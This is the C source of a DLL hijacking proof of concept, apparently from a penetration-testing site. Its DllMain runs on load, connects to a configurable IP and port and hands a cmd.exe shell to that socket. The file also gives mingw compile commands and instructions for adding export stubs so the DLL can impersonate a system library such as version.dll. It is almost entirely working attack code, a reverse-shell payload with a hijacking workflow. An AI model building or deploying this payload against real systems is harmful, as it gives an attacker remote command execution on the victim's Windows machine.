/*
Name        : reverse.c
Description : DLL Hijacking PoC that creates a reverse shell.
Compile 64  : x86_64-w64-mingw32-gcc -shared -o reverse.dll reverse.c -lws2_32 -fPIC
Compile 32  : i686-w64-mingw32-gcc -shared -o reverse.dll reverse.c -lws2_32 -fPIC
Author      : Lisandre.com
Date        : 2025-05-02
Prereq      : Run sigcheck from Sysinternals to know if the app is 32-bit or 64-bit
              sigcheck.exe VulnerableApp.exe
*/
#include <winsock2.h>
#include <stdio.h>
#pragma comment(lib,"ws2_32")

// UPDATE THIS!!!
#define IP "127.0.0.1"
#define PORT 4444

WSADATA wsaData;
SOCKET Winsock;
struct sockaddr_in hax; 

STARTUPINFO ini_processo;
PROCESS_INFORMATION processo_info;

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    hax.sin_family = AF_INET;
    hax.sin_port = htons(PORT);
    hax.sin_addr.s_addr = inet_addr(IP);

    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

    memset(&ini_processo, 0, sizeof(ini_processo));
    ini_processo.cb = sizeof(ini_processo);
    ini_processo.dwFlags = STARTF_USESTDHANDLES;
    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;

    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);

    return TRUE;
}

// Add stub functions here to prevent entry point errors, see export-dll-functions-stubs.py

/*
Example: C:\Windows\System32\systeminfo.exe (64-bit), version.dll
python3 export-dll-functions-stubs.py version.dll > version-stubs.txt
# modify the function stubs as needed
cat reverse.c version-stubs.txt > version.c
x86_64-w64-mingw32-gcc -shared -o version.dll version.c -lws2_32 -fPIC
*/
